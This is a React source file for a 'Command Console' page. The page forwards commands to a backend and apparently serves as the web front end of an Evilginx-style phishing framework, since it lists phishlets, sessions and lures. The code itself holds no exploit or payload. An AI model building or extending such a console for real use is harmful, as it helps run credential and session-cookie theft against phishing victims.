import React, { useState, useEffect } from 'react';
import { commandAPI } from '../api/client';
import '../styles/console.css';

export default function ConsolePage() {
  const [command, setCommand] = useState('');
  const [output, setOutput] = useState([]);
  const [loading, setLoading] = useState(false);

  const handleExecute = async (e) => {
    e.preventDefault();
    if (!command.trim()) return;

    setLoading(true);
    const timestamp = new Date().toLocaleTimeString();
    
    try {
      const response = await commandAPI.execute(command);
      const result = response.data.data;
      
      setOutput(prev => [
        ...prev,
        { type: 'command', text: `> ${command}`, timestamp },
        { type: 'result', text: JSON.stringify(result, null, 2), timestamp }
      ]);
      setCommand('');
    } catch (err) {
      const errorMsg = err.response?.data?.error || 'Command failed';
      setOutput(prev => [
        ...prev,
        { type: 'command', text: `> ${command}`, timestamp },
        { type: 'error', text: errorMsg, timestamp }
      ]);
    } finally {
      setLoading(false);
    }
  };

  const clearConsole = () => {
    setOutput([]);
  };

  return (
    <div className="console-page">
      <h2>Command Console</h2>
      
      <div className="console-output">
        {output.map((line, idx) => (
          <div key={idx} className={`console-line ${line.type}`}>
            <span className="timestamp">{line.timestamp}</span>
            <span className="text">{line.text}</span>
          </div>
        ))}
        {output.length === 0 && (
          <div className="console-placeholder">Available commands: phishlets, sessions, lures, config</div>
        )}
      </div>

      <form onSubmit={handleExecute} className="console-input">
        <input
          type="text"
          value={command}
          onChange={(e) => setCommand(e.target.value)}
          placeholder="Enter command (e.g., phishlets, sessions, lures delete &lt;id&gt;)"
          disabled={loading}
          autoFocus
        />
        <button type="submit" disabled={loading}>Execute</button>
        <button type="button" onClick={clearConsole} className="btn-secondary">Clear</button>
      </form>
    </div>
  );
}
